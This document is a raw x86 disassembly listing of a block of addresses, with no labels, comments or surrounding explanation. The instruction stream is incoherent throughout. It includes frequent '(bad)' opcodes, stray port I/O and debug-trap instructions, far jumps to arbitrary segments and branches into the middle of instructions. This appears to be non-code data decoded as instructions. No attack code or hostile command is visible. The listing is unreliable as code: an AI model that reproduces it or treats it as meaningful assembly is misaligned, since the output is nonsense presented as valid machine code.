  42209d:	mov    bl,BYTE PTR [ebx]
  42209f:	xchg   ebp,eax
  4220a0:	out    dx,al
  4220a1:	ja     0x4220a1
  4220a3:	mov    ebp,0x61029937
  4220a8:	repnz sub edx,DWORD PTR [edi]
  4220ab:	adc    bh,BYTE PTR [ebx+ebx*8]
  4220ae:	xor    esi,DWORD PTR [edi-0x5b901130]
  4220b4:	xor    al,0x74
  4220b6:	dec    edx
  4220b7:	xor    BYTE PTR [eax],cl
  4220b9:	fdivr  QWORD PTR [esi-0x5f725522]
  4220bf:	mov    ds:0x9e0acbcc,eax
  4220c4:	jns    0x42208c
  4220c6:	mov    bh,0x52
  4220c8:	xchg   edx,eax
  4220c9:	xor    eax,0xff35761f
  4220ce:	xchg   ecx,eax
  4220cf:	cmp    al,BYTE PTR [esi-0x6e81bcc0]
  4220d5:	aas    
  4220d6:	lds    ecx,FWORD PTR [ecx-0x15966dbe]
  4220dc:	sbb    esp,DWORD PTR [ebp-0x67261ba2]
  4220e2:	fidiv  DWORD PTR [edx]
  4220e4:	in     al,dx
  4220e5:	push   eax
  4220e6:	jno    0x4220e5
  4220e8:	ror    BYTE PTR [ebp+ebx*1+0x7d9c863b],cl
  4220ef:	(bad)  
  4220f0:	in     al,dx
  4220f1:	test   al,0x86
  4220f4:	mov    cl,0x6
  4220f6:	aam    0x93
  4220f8:	push   ebp
  4220f9:	inc    ebp
  4220fa:	mov    ecx,0xc4ddabbf
  4220ff:	jno    0x42208e
  422101:	sub    al,0x35
  422103:	or     BYTE PTR [esi+0x49],dl
  422106:	jmp    0x52fc:0xa3d2b178
  42210d:	js     0x422115
  42210f:	scas   al,BYTE PTR es:[edi]
  422110:	add    edi,DWORD PTR [esi-0x8a48558]
  422116:	xchg   DWORD PTR [edi-0x59],esp
  422119:	dec    eax
  42211a:	mov    ds:0xb37b60b2,eax
  42211f:	adc    eax,0xb8c2e832
  422124:	pop    ds
  422125:	inc    esp
  422126:	xchg   ecx,eax
  422127:	sbb    al,0x5c
  422129:	aaa    
  42212a:	mov    ebp,eax
  42212c:	mov    ecx,0xa4b3a2bb
  422131:	loop   0x422153
  422133:	jo     0x4220c6
  422135:	shr    DWORD PTR [esi+0x249c78df],cl
  42213b:	scas   eax,DWORD PTR es:[edi]
  42213c:	(bad)  
  42213d:	cmp    cl,BYTE PTR [eax+edx*1+0x6a]
  422141:	xchg   cx,ax
  422143:	imul   edx,DWORD PTR [ebp-0x73],0x4c
  422147:	std    
  422148:	adc    ebx,eax
  42214a:	fs (bad) 
  42214c:	xchg   DWORD PTR [eax],ecx
  42214e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42214f:	xchg   edi,eax
  422150:	ficomp WORD PTR [ebx]
  422152:	sub    ebx,DWORD PTR [edx-0x44]
  422155:	scas   al,BYTE PTR es:[edi]
  422156:	int    0xb4
  422158:	push   0xffffffc6
  42215a:	ret    0x15c2
  42215d:	jnp    0x42216e
  42215f:	add    BYTE PTR [ebx-0x2745c171],dh
  422165:	cmp    DWORD PTR [ebx+ecx*2],esi
  422168:	inc    edi
  422169:	(bad)  [edi]
  42216b:	xchg   ecx,ebp
  42216d:	sub    al,0x0
	...
  4221d3:	add    BYTE PTR [eax],al
  4221d5:	add    BYTE PTR [esi-0x284ae],ah
  4221db:	std    
  4221dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221dd:	pop    ebx
  4221de:	dec    edx
  4221df:	sub    al,0x42
  4221e1:	sub    eax,DWORD PTR [edi+ebx*8+0x6e67a566]
  4221e8:	add    DWORD PTR [eax],eax
  4221ea:	add    BYTE PTR [ecx],al
  4221ec:	add    BYTE PTR [eax],al
  4221ee:	imul   ecx,DWORD PTR [edx-0x51],0xfffffff1
  4221f2:	adc    BYTE PTR ds:0x28721489,dl
  4221f8:	and    edi,DWORD PTR [esi-0x68f511b5]
  4221fe:	or     ebx,ebx
  422200:	fcmovnbe st,st(5)
  422202:	xor    al,0x97
  422204:	jbe    0x422276
  422206:	je     0x4221f3
  422208:	mov    BYTE PTR ss:[esi-0xc7a781a],cl
  42220f:	dec    esi
  422210:	cmovge ecx,DWORD PTR [edi+edx*8-0x36]
  422215:	xor    BYTE PTR [edx+0x3],al
  422218:	sub    edi,esi
  42221a:	push   esp
  42221b:	mov    ebx,esi
  42221d:	mov    ds:0xe3c17819,eax
  422222:	cli    
  422223:	push   edi
  422224:	outs   dx,DWORD PTR ds:[esi]
  422225:	aas    
  422226:	push   esp
  422227:	mov    cl,bl
  422229:	jl     0x42224f
  42222b:	pusha  
  42222c:	sub    ah,0xc9
  42222f:	arpl   WORD PTR [ecx+0x71],sp
  422232:	je     0x422293
  422234:	mov    ch,0xd7
  422236:	into   
  422237:	xchg   edi,eax
  422238:	mov    cl,0x28
  42223a:	addr16 xchg esp,eax
  42223c:	fidivr DWORD PTR [edx*4-0x5fed10d0]
  422243:	jl     0x422213
  422245:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  422247:	xor    esp,DWORD PTR [esi-0xdeb1ac1]
  42224d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42224e:	push   eax
  42224f:	inc    ecx
  422250:	adc    ecx,ebp
  422252:	sbb    BYTE PTR [ebx],bl
  422254:	and    eax,DWORD PTR [esp+eax*8-0x22]
  422258:	cmp    BYTE PTR [eax+0x78],cl
  42225b:	aaa    
  42225c:	vmread DWORD PTR ds:0x2c78da73,ebx
  422263:	and    DWORD PTR [eax-0x2c],ebx
  422266:	in     eax,dx
  422267:	mov    ds:0x42c90b7a,al
  42226c:	pusha  
  42226d:	adc    ch,BYTE PTR [edx+0x15]
  422270:	jnp    0x42224d
  422272:	pusha  
  422273:	mov    eax,0xd6ec1f2c
  422278:	test   eax,0x7e52eefb
  42227d:	inc    edx
  42227e:	sub    eax,DWORD PTR [edi]
  422280:	mov    WORD PTR [esi+0x1f],?
  422283:	out    dx,al
  422284:	shl    DWORD PTR [ebp-0x77],1
  422287:	int    0x67
  422289:	xchg   esp,eax
  42228a:	js     0x42220d
  42228c:	xchg   DWORD PTR [ebp-0x40188c37],esp
  422292:	in     eax,0x18
  422294:	ins    DWORD PTR es:[edi],dx
  422295:	inc    esp
  422296:	pushf  
  422297:	popf   
  422298:	aad    0xc8
  42229a:	jne    0x422319
  42229c:	repnz sahf 
  42229e:	aad    0xcb
  4222a0:	div    bh
  4222a2:	ret    0xd489
  4222a5:	add    ecx,DWORD PTR [ecx-0x70]
  4222a8:	mov    eax,ds:0x2f4d5bed
  4222ad:	jo     0x4222b5
  4222af:	(bad)  
  4222b0:	dec    esi
  4222b1:	cdq    
  4222b2:	xlat   BYTE PTR ds:[ebx]
  4222b3:	int3   
  4222b4:	scas   eax,DWORD PTR es:[edi]
  4222b5:	inc    ebp
  4222b6:	test   BYTE PTR [edx],bh
  4222b8:	call   FWORD PTR [ebp+eiz*1+0x2c]
  4222bc:	sub    al,0x1a
  4222be:	mov    bl,0xc9
  4222c0:	xor    al,0xd8
  4222c2:	sbb    cl,bh
  4222c4:	sub    edx,DWORD PTR [ebx+edi*8-0x36062699]
  4222cb:	cdq    
  4222cc:	pop    edi
  4222cd:	jb     0x422300
  4222cf:	pop    ecx
  4222d0:	sub    al,ch
  4222d2:	cld    
  4222d3:	mov    esi,0x3d808c41
  4222d8:	lods   eax,DWORD PTR ds:[esi]
  4222d9:	stc    
  4222da:	sbb    ebx,DWORD PTR [eax+edx*8-0x43]
  4222de:	cmp    BYTE PTR [eax],0xa2
  4222e1:	push   es
  4222e2:	dec    esi
  4222e3:	xor    al,0xa8
  4222e5:	pushf  
  4222e6:	sub    DWORD PTR [ebx+0x30],eax
  4222e9:	test   DWORD PTR [ebp+0xd52ce8],ebp
	...
  422353:	add    BYTE PTR [eax],al
  422355:	add    BYTE PTR [edi-0x10085213],cl
  42235b:	neg    edi
  42235d:	std    
  42235e:	sub    ebx,DWORD PTR [ebp+0x71]
  422361:	dec    ecx
  422362:	add    BYTE PTR [edx],0x98
  422365:	push   0x67
  422367:	outs   dx,DWORD PTR ds:[esi]
  422368:	add    DWORD PTR [eax],eax
  42236a:	add    BYTE PTR [ecx],al
  42236c:	add    BYTE PTR [eax],al
  42236e:	pop    eax
  42236f:	mov    ds:0xcca3cff4,al
  422374:	add    BYTE PTR [edi-0x20],dh
  422377:	push   edi
  422378:	adc    edi,DWORD PTR [ecx+esi*4-0x55bd0b3a]
  42237f:	adc    eax,0x2644cd92
  422384:	push   edx
  422385:	sbb    eax,0x2f40d9a3
  42238a:	push   ebp
  42238b:	les    edx,FWORD PTR [esi+0x29]
  42238e:	adc    bl,dh
  422390:	push   es
  422391:	mov    DWORD PTR [edx+0x12b4d54d],edi
  422397:	iret   
  422398:	dec    edi
  422399:	jno    0x42240b
  42239b:	push   esp
  42239c:	rcl    DWORD PTR [esi+ecx*1],0xa4
  4223a0:	pop    es
  4223a1:	pop    esi
  4223a2:	fisubr WORD PTR [ecx+0x24]
  4223a5:	js     0x4223d5
  4223a7:	or     al,0x79
  4223a9:	mov    gs,edi
  4223ab:	test   al,0xc5
  4223ad:	fnstsw WORD PTR [edx]
  4223af:	test   DWORD PTR [eax],ebx
  4223b1:	push   eax
  4223b2:	jno    0x4223b6
  4223b4:	out    0x42,eax
  4223b6:	or     esp,edx
  4223b8:	icebp  
  4223b9:	pop    eax
  4223ba:	cmp    al,0x12
  4223bc:	pop    eax
  4223bd:	mov    ecx,DWORD PTR [ecx+0x7285f7c2]
  4223c3:	retf   0xa9d8
  4223c6:	push   0x2f16303
  4223cb:	lds    ecx,FWORD PTR [edx+0x36e89dda]
  4223d1:	mov    BYTE PTR [ecx+ebx*4],bh
  4223d4:	add    bh,BYTE PTR [edx+0x3]
  4223d7:	pop    esi
  4223d8:	in     al,0x40
  4223da:	add    ah,BYTE PTR [edx+edx*4-0x17888eb2]
  4223e1:	add    ecx,esp
  4223e3:	mov    ebp,0xacbadc85
  4223e8:	dec    esp
  4223e9:	mov    bl,0x7b
  4223eb:	mov    bl,0xc3
  4223ed:	add    al,0x39
  4223ef:	stos   DWORD PTR es:[edi],eax
  4223f0:	int3   
  4223f1:	mov    ?,WORD PTR [edx+0x53d0922b]
  4223f7:	cld    
  4223f8:	mov    dh,0xc0
  4223fa:	add    al,0xf5
  4223fc:	xor    BYTE PTR [edi+ebp*4],cl
  4223ff:	pop    ds
  422400:	scas   eax,DWORD PTR es:[edi]
  422401:	hlt    
  422402:	adc    DWORD PTR [ecx],edx
  422404:	mov    edx,0x7b8f3375
  422409:	pop    ss
  42240a:	dec    BYTE PTR [esi+0x79]
  42240d:	pop    ds
  42240e:	popa   
  42240f:	aas    
  422410:	sub    BYTE PTR [edi+0x5834688a],bl
  422416:	idiv   esp
  422418:	push   edi
  422419:	fsubr  QWORD PTR [edi+eax*2-0x43946e4c]
  422420:	outs   dx,BYTE PTR ds:[esi]
  422421:	sahf   
  422422:	mov    ss,edi
  422424:	xor    DWORD PTR [ecx],edi
  422426:	mov    edi,0x3c7ef573
  42242b:	in     al,dx
  42242c:	jno    0x4223cb
  42242e:	dec    edx
  42242f:	add    DWORD PTR [edi-0xe94c6d2],edi
  422435:	rol    ecx,0x5
  422438:	and    edx,DWORD PTR [ecx]
  42243a:	mov    BYTE PTR ds:0x6db49dec,dh
  422440:	cmc    
  422441:	je     0x4223ef
  422443:	jmp    0x7611597
  422448:	gs rcr bl,1
  42244b:	fwait
  42244c:	es xor al,0xf8
  42244f:	sar    BYTE PTR [ebx],cl
  422451:	xor    BYTE PTR [ebx+0x129f3c0a],dl
  422457:	test   eax,0x200380a2
  42245c:	pop    ebp
  42245d:	sbb    eax,0xc23e2574
  422462:	pop    edx
  422463:	add    al,0x6a
  422466:	mov    ebx,ss
  422468:	fadd   DWORD PTR [esi+0x45f75d09]
	...
  4224d6:	push   edx
  4224d7:	sub    BYTE PTR [esi],0x69
  4224da:	(bad)  
  4224db:	in     eax,dx
  4224dc:	push   edi
  4224dd:	mov    ebx,0x99e531bb
  4224e2:	fsubp  st(5),st
  4224e4:	int3   
  4224e5:	pop    ebp
  4224e6:	addr16 jo 0x4224ea
  4224e9:	add    BYTE PTR [eax],al
  4224eb:	add    DWORD PTR [eax],eax
  4224ed:	add    BYTE PTR [esi],ch
  4224ef:	jb     0x42255b
  4224f1:	call   DWORD PTR [esi+0x79]
  4224f4:	adc    esi,DWORD PTR [edi+0x2e779c4b]
  4224fa:	push   0x4ea4e2a8
  4224ff:	pop    esi
  422500:	shr    ebp,1
  422502:	(bad)  
  422503:	sahf   
  422504:	jae    0x422570
  422506:	mov    esi,ebp
  422508:	enter  0x7e9d,0x48
  42250c:	or     eax,0x88f2456
  422511:	sbb    al,0x1f
  422513:	les    ebp,FWORD PTR [esi]
  422515:	cmp    al,0x1e
  422517:	ficom  DWORD PTR [bp+0x1a98]
  42251c:	cli    
  42251d:	leave  
  42251e:	jns    0x422517
  422520:	pop    es
  422521:	and    eax,DWORD PTR [eax+esi*4-0x29a6bac7]
  422528:	push   eax
  422529:	stos   BYTE PTR es:[edi],al
  42252a:	xor    ch,0x6
  42252d:	fwait
  42252e:	dec    esp
  42252f:	jmp    0x422552
  422531:	test   ax,0x91bc
  422535:	mov    ebp,0x3e55616e
  42253a:	adc    al,0xbe
  42253c:	(bad)  
  42253d:	rol    DWORD PTR ds:0x585af5e5,1
  422543:	dec    ebx
  422544:	sub    ecx,DWORD PTR [edx+0x6b5c306]
  42254a:	sub    ah,0xbe
  42254d:	sub    BYTE PTR [esi],0xae
  422550:	pop    esp
  422551:	icebp  
  422552:	stc    
  422553:	xchg   BYTE PTR [ebp+0x48e2791e],cl
  422559:	pop    ebx
  42255a:	sbb    DWORD PTR [eax+0x17],ebp
  42255d:	add    BYTE PTR ds:0x67ff9793,ch
  422563:	test   al,0x15
  422565:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422566:	lock push edi
  422568:	call   0xcec27283
  42256d:	sub    BYTE PTR [edi+0x3c],0xaf
  422571:	ret    0x26c5
  422574:	ins    BYTE PTR es:[edi],dx
  422575:	xchg   ebx,eax
  422576:	xor    dl,BYTE PTR [eax]
  422578:	out    dx,al
  422579:	mov    esi,0x89d284c3
  42257e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422580:	mov    cl,0xc0
  422582:	sbb    DWORD PTR [esi],eax
  422584:	cld    
  422585:	sbb    al,0x70
  422587:	out    0xde,eax
  422589:	xchg   esi,eax
  42258a:	hlt    
  42258b:	xor    al,0x37
  42258d:	pop    ebx
  42258e:	push   0x4b
  422590:	add    DWORD PTR [ebx],esi
  422592:	push   cs
  422593:	bound  ebx,QWORD PTR [ebx+ecx*2-0x2902f07f]
  42259a:	sbb    al,0xf6
  42259c:	add    al,0x6b
  42259e:	inc    esi
  42259f:	(bad)  
  4225a0:	aad    0xa8
  4225a2:	sub    bh,BYTE PTR [eax]
  4225a4:	sub    BYTE PTR [esi+0x14cc010d],0xe9
  4225ab:	(bad)  
  4225ac:	xchg   DWORD PTR [edx],esi
  4225ae:	in     al,0xd8
  4225b0:	inc    ecx
  4225b1:	cmp    eax,0xb79ae917
  4225b6:	in     al,dx
  4225b7:	test   dh,ah
  4225b9:	fdiv   QWORD PTR ds:0x56d9dbe6
  4225bf:	adc    eax,0x56f7a961
  4225c4:	add    eax,0x6a510c7b
  4225c9:	and    BYTE PTR [ebp-0x15],0xa3
  4225cd:	data16 mov dl,0x56
  4225d0:	jle    0x422556
  4225d2:	mov    edx,0xb39b8030
  4225d7:	mov    al,0x60
  4225d9:	mov    ch,0xf2
  4225db:	fst    QWORD PTR [edi]
  4225dd:	mov    al,BYTE PTR [edi+edi*1]
  4225e0:	mov    al,0x43
  4225e2:	or     BYTE PTR [ecx+0x19fe3c9d],ch
  4225e8:	jecxz  0x42256c
  4225ea:	das    
  4225eb:	fsubr  DWORD PTR [eax+0xf1]
	...
  422655:	add    BYTE PTR [edx-0x40887052],bl
  42265b:	ja     0x422657
  42265d:	out    dx,eax
  42265e:	sbb    esi,DWORD PTR [ecx-0x63cc5d08]
  422664:	sub    DWORD PTR [esi+0x67],0x171
  42266b:	add    DWORD PTR [eax],eax
  42266d:	add    BYTE PTR [eax+ecx*1],al
  422670:	xor    BYTE PTR [edi+0x3f],al
  422673:	lods   al,BYTE PTR ds:[esi]
  422674:	jo     0x4226b2
  422676:	psadbw mm3,QWORD PTR [edi]
  422679:	repz push 0x28dd573b
  42267f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422680:	lea    esi,[esi+0x30]
  422683:	mov    ebx,0x52f90e11
  422688:	sub    eax,eax
  42268a:	pop    eax
  42268b:	and    al,0xf1
  42268d:	cwde   
  42268e:	push   eax
  42268f:	in     al,0x70
  422691:	aam    0x16
  422693:	inc    esp
  422694:	jmp    0x5d47:0xfe770ea8
  42269b:	sbb    al,0xf9
  42269d:	into   
  42269e:	test   eax,0xc1f25452
  4226a3:	inc    edx
  4226a4:	push   esp
  4226a5:	lock aaa 
  4226a7:	push   ebx
  4226a8:	cli    
  4226a9:	in     eax,0x67
  4226ab:	imul   edx,DWORD PTR [edi],0x68172247
  4226b1:	lods   eax,DWORD PTR ds:[esi]
  4226b2:	ins    DWORD PTR es:[edi],dx
  4226b3:	jp     0x4226c0
  4226b5:	add    dh,al
  4226b7:	xor    BYTE PTR [edx-0x33e31e80],cl
  4226bd:	mov    edi,0xdbef39f
  4226c2:	pop    edx
  4226c3:	(bad)  
  4226c5:	mov    al,0xcc
  4226c7:	cmp    bl,BYTE PTR [edx]
  4226c9:	dec    ecx
  4226ca:	or     bl,BYTE PTR [esi+0x2752cb29]
  4226d0:	test   DWORD PTR ds:0x1e5db002,ebx
  4226d6:	dec    eax
  4226d7:	cdq    
  4226d8:	adc    edi,DWORD PTR [ecx]
  4226da:	stos   BYTE PTR es:[edi],al
  4226db:	sar    BYTE PTR [edx-0x5c],0x4a
  4226df:	pop    es
  4226e0:	push   eax
  4226e1:	test   al,0x32
  4226e3:	pop    ss
  4226e4:	(bad)  
  4226e5:	or     edx,DWORD PTR [esi+0x767afd1b]
  4226eb:	push   esp
  4226ec:	xor    dl,BYTE PTR ds:0xbee17118
  4226f2:	(bad)  
  4226f3:	cmp    ebx,DWORD PTR [ebp-0x6b39b24e]
  4226f9:	jge    0x42268c
  4226fb:	xchg   esp,eax
  4226fc:	fnstenv [edi-0x9]
  4226ff:	div    DWORD PTR [ebp+eiz*4-0x5732bcb7]
  422706:	ret    0x975e
  422709:	xor    BYTE PTR [esi+eax*2+0x56],ah
  42270d:	int    0xbb
  42270f:	cli    
  422710:	arpl   WORD PTR [esi],bx
  422712:	inc    esi
  422713:	int    0xe9
  422715:	stos   DWORD PTR es:[edi],eax
  422716:	pop    esi
  422717:	cmp    eax,0x51604d64
  42271c:	(bad)  
  42271d:	pop    esp
  42271e:	pop    ebp
  42271f:	mov    esi,0xa1190e83
  422724:	repz mov eax,ds:0xb921367d
  42272a:	add    eax,ecx
  42272c:	pop    eax
  42272d:	call   0xacfe:0xbe38a077
  422734:	(bad)  
  422735:	icebp  
  422736:	sbb    ebp,DWORD PTR [edx-0x72]
  422739:	add    al,dh
  42273b:	push   esp
  42273c:	enter  0x510e,0xc7
  422740:	or     DWORD PTR [esi],esp
  422742:	sub    al,0x80
  422744:	int3   
  422745:	(bad)  [edx]
  422747:	js     0x4227b4
  422749:	mov    eax,ds:0x27ccbf80
  42274e:	cmp    BYTE PTR [edi-0x1f],bl
  422751:	gs adc al,0x89
  422754:	mov    al,0xad
  422756:	(bad)  
  422758:	scas   al,BYTE PTR es:[edi]
  422759:	data16 cld 
  42275b:	sbb    esi,esp
  42275d:	ret    
  42275e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42275f:	cmc    
  422760:	fxch   st(1)
  422762:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422763:	(bad)  
  422764:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422765:	int    0x3a
  422767:	jno    0x4227e6
  422769:	push   esp
  42276a:	dec    edx
  42276b:	sete   cl
	...
  4227d6:	daa    
  4227d7:	sub    eax,0x7d7f2d7d
  4227dc:	ja     0x42280d
  4227de:	mov    esi,0x9c7f01c8
  4227e3:	fldcw  WORD PTR [ecx+0x17267f3]
  4227e9:	add    BYTE PTR [eax],al
  4227eb:	add    DWORD PTR [eax],eax
  4227ed:	add    BYTE PTR [edi-0x283c8d3b],al
  4227f3:	sbb    cl,bl
  4227f5:	inc    edx
  4227f6:	cmp    esi,edi
  4227f8:	ins    BYTE PTR es:[edi],dx
  4227f9:	iret   
  4227fa:	in     al,0x5d
  4227fc:	popaw  
  4227fe:	mov    cl,0x51
  422800:	jl     0x4227c5
  422802:	call   0x6404:0xaa6583eb
  422809:	loopne 0x42281a
  42280b:	outs   dx,BYTE PTR ds:[esi]
  42280c:	and    bh,BYTE PTR [ebp+eax*4-0x5f99e592]
  422813:	sbb    BYTE PTR [edx],bh
  422815:	lahf   
  422816:	call   0xa608:0xa5bf74ad
  42281d:	pop    ss
  42281e:	xchg   ebp,eax
  42281f:	dec    esp
  422820:	and    DWORD PTR [edx+0x122b1b9c],0x8d5c42b3
  42282a:	pop    ss
  42282b:	cwde   
  42282c:	shl    DWORD PTR [esp+ecx*8],1
  42282f:	sbb    eax,DWORD PTR [esi-0x79]
  422832:	fwait
  422833:	jne    0x4227dc
  422835:	bswap  ecx
  422837:	xor    esp,edx
  422839:	jbe    0x422817
  42283b:	xor    bh,BYTE PTR [ecx]
  42283d:	pop    es
  42283e:	sbb    esp,ecx
  422840:	add    BYTE PTR [ecx+0x68],bh
  422843:	sbb    al,0x73
  422845:	sbb    ch,BYTE PTR [eax+edx*4+0x56]
  422849:	popf   
  42284a:	inc    edx
  42284b:	fstp   TBYTE PTR [ecx-0x1f]
  42284e:	les    esp,FWORD PTR [edi]
  422850:	pop    es
  422851:	outs   dx,DWORD PTR ds:[esi]
  422852:	push   ebp
  422853:	test   eax,0x49964ff5
  422858:	hlt    
  422859:	int    0x45
  42285b:	in     eax,0x6d
  42285d:	mov    al,ds:0x6b8a0e2d
  422862:	and    dl,BYTE PTR [ecx]
  422864:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422865:	or     ax,0xb6f8
  422869:	mov    cs,WORD PTR [ebx]
  42286b:	js     0x4227f8
  42286d:	icebp  
  42286e:	das    
  42286f:	inc    esi
  422870:	(bad)  
  422871:	and    DWORD PTR [esi-0x39],ebx
  422874:	lods   al,BYTE PTR ds:[esi]
  422875:	popf   
  422876:	scas   al,BYTE PTR es:[edi]
  422877:	xchg   ebx,eax
  422878:	add    al,0xc8
  42287a:	inc    ebp
  42287b:	cdq    
  42287c:	add    bl,BYTE PTR [esi]
  42287e:	add    eax,0x9664c595
  422883:	fldenv [eax]
  422885:	xchg   esp,eax
  422886:	push   es
  422887:	cld    
  422888:	mov    ah,dl
  42288a:	loope  0x4228be
  42288c:	mov    WORD PTR [esi-0x28bf5370],ss
  422892:	ins    DWORD PTR es:[edi],dx
  422893:	cmp    al,0x1a
  422895:	fldcw  WORD PTR [ebx]
  422897:	(bad)  
  422898:	loopne 0x422859
  42289a:	mov    bl,0xed
  42289c:	call   0xe33c:0xc4a95916
  4228a3:	lahf   
  4228a4:	daa    
  4228a5:	in     al,0xb3
  4228a7:	test   esi,esi
  4228a9:	sbb    BYTE PTR [ecx],dl
  4228ab:	jg     0x4228c1
  4228ad:	dec    edx
  4228ae:	dec    ebp
  4228af:	pop    ecx
  4228b0:	test   al,0x17
  4228b2:	inc    eax
  4228b3:	fdivr  DWORD PTR ds:0x57ee62c5
  4228b9:	jl     0x4228fe
  4228bb:	inc    edx
  4228bc:	jecxz  0x422871
  4228be:	dec    ebp
  4228bf:	ja     0x4228c0
  4228c1:	xor    ah,ch
  4228c3:	js     0x4228a1
  4228c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228c6:	adc    BYTE PTR [edx+0x482a3bd8],dl
  4228cc:	dec    esi
  4228cd:	or     BYTE PTR [eax+0x1f9bc091],bl
  4228d3:	mov    ds:0x886dfd1b,eax
  4228d8:	js     0x4228c3
  4228da:	in     eax,0xf3
  4228dc:	inc    ebx
  4228dd:	sub    dh,bh
  4228df:	xchg   DWORD PTR [ebx-0x37],esi
  4228e2:	adc    DWORD PTR [ecx+0xd],ebx
  4228e5:	fisubr DWORD PTR [ebp-0x3cbec688]
  4228eb:	(bad)  
  4228ec:	stc    
  4228ed:	adc    al,BYTE PTR [eax]
	...
  422953:	add    BYTE PTR [eax],al
  422955:	add    ch,cl
  422957:	cmp    DWORD PTR [eax-0x10680369],edi
  42295d:	jnp    0x42291d
  42295f:	outs   dx,DWORD PTR ds:[esi]
  422960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422961:	loopne 0x422977
  422963:	hlt    
  422964:	pop    ebp
  422965:	scas   al,BYTE PTR es:[edi]
  422966:	addr16 jae 0x42296a
  422969:	add    BYTE PTR [eax],al
  42296b:	add    DWORD PTR [eax],eax
  42296d:	add    BYTE PTR [ecx+0x58],dl
  422970:	test   DWORD PTR [ebx+0x10cc07e3],ecx
  422976:	(bad)  
  422977:	push   cs
  422978:	nop
  422979:	or     ah,BYTE PTR [ebp-0x7c]
  42297c:	pop    es
  42297d:	sbb    ch,BYTE PTR [ecx]
  42297f:	ds or  eax,0xaefe08af
  422985:	out    dx,eax
  422986:	jno    0x42299f
  422988:	je     0x42295d
  42298a:	inc    edx
  42298b:	cmp    al,0xe6
  42298d:	sti    
  42298e:	inc    ebp
  42298f:	in     al,dx
  422990:	fimul  WORD PTR [eax-0xd42c930]
  422996:	or     BYTE PTR [edi+0x527daf49],al
  42299c:	mov    ecx,0x324735ee
  4229a1:	xor    ebp,DWORD PTR [esi+0x45]
  4229a4:	jae    0x422997
  4229a6:	add    bl,BYTE PTR [esi+0x2ba9e3ad]
  4229ac:	lock jge 0x4229c6
  4229af:	mov    cl,BYTE PTR [edx+edx*2]
  4229b2:	inc    eax
  4229b3:	adc    eax,0x743b8958
  4229b8:	mov    cs,WORD PTR [esi+0x5b]
  4229bb:	test   edx,edi
  4229bd:	rcr    DWORD PTR [ebx-0x7d],1
  4229c0:	push   ss
  4229c1:	pop    ebx
  4229c2:	and    eax,0x55cd6613
  4229c7:	adc    al,0x26
  4229c9:	psadbw mm1,QWORD PTR ds:0x8a38d07e
  4229d0:	imul   ecx,DWORD PTR [esp+edx*8+0x7029e13f],0x75a667fc
  4229db:	clc    
  4229dc:	xchg   esp,eax
  4229dd:	mov    dl,0x9e
  4229df:	(bad)  
  4229e0:	mov    ch,0x73
  4229e2:	jbe    0x422967
  4229e4:	cmp    al,0x36
  4229e6:	xor    BYTE PTR [ebp+0x2cc004fe],dh
  4229ec:	cmp    eax,0xfa70666a
  4229f1:	test   esp,0x41eecf71
  4229f7:	mov    ecx,0xaa25035b
  4229fc:	(bad)  
  4229fd:	ficomp WORD PTR [ebx]
  4229ff:	rcl    DWORD PTR [ecx],1
  422a01:	sti    
  422a02:	in     eax,dx
  422a03:	push   esi
  422a04:	sub    eax,0xa39dde
  422a09:	fdiv   DWORD PTR [ebx+0x28]
  422a0c:	outs   dx,DWORD PTR ds:[esi]
  422a0d:	data16 shl BYTE PTR [eax+0x46],0xb4
  422a12:	adc    al,0x8b
  422a14:	icebp  
  422a15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a16:	xlat   BYTE PTR ds:[ebx]
  422a17:	inc    eax
  422a18:	jns    0x422a3e
  422a1a:	leave  
  422a1b:	jnp    0x4229c5
  422a1d:	retf   
  422a1e:	jns    0x422a59
  422a20:	test   eax,0x58536c1
  422a25:	inc    eax
  422a26:	jmp    0x45f08983
  422a2b:	fnsave [esi-0x7f]
  422a2e:	inc    eax
  422a2f:	xchg   dl,ch
  422a31:	dec    eax
  422a32:	or     BYTE PTR [ebx-0x19],0x34
  422a36:	xor    BYTE PTR [edx-0x62],bh
  422a39:	mov    ecx,0x81c3431
  422a3e:	(bad)  
  422a40:	cmp    BYTE PTR [ebp+0x24],bl
  422a43:	pusha  
  422a44:	sub    al,0xa2
  422a46:	adc    DWORD PTR [ebp+ecx*1-0x7],ecx
  422a4a:	sbb    DWORD PTR [edx-0x736166e9],ebx
  422a50:	mov    edi,0xd09109ea
  422a55:	mov    ds:0x293f0585,eax
  422a5a:	call   0x4a76b15d
  422a5f:	pop    ds
  422a60:	idiv   BYTE PTR [ecx]
  422a62:	in     al,0x86
  422a64:	jp     0x422a69
  422a66:	jle    0x422a82
  422a68:	lahf   
  422a69:	cmp    ch,al
  422a6b:	cli    
  422a6c:	loop   0x422a55
	...
  422ad6:	xchg   esi,eax
  422ad7:	push   0x18
  422ad9:	mov    ah,bh
  422adb:	cli    
  422adc:	xchg   esi,eax
  422add:	jle    0x422ab0
  422adf:	push   esp
  422ae0:	je     0x422a9f
  422ae2:	pop    edi
  422ae3:	jge    0x422af7
  422ae5:	frstor [edi+0x74]
  422ae8:	add    DWORD PTR [eax],eax
  422aea:	add    BYTE PTR [ecx],al
  422aec:	add    BYTE PTR [eax],al
  422aee:	aam    0x34
  422af0:	mov    ds:0xa674675c,eax
  422af5:	ret    
  422af6:	ja     0x422b0f
  422af8:	stos   DWORD PTR es:[edi],eax
  422af9:	(bad)  
  422afa:	dec    esi
  422afb:	ins    BYTE PTR es:[edi],dx
  422afc:	jo     0x422aa2
  422afe:	xor    al,0xc8
  422b00:	hlt    
  422b01:	pop    ebx
  422b02:	and    al,0xb2
  422b04:	and    ecx,edx
  422b06:	fisub  DWORD PTR [eax-0x4e46b05]
  422b0c:	inc    esi
  422b0d:	(bad)  
  422b0e:	icebp  
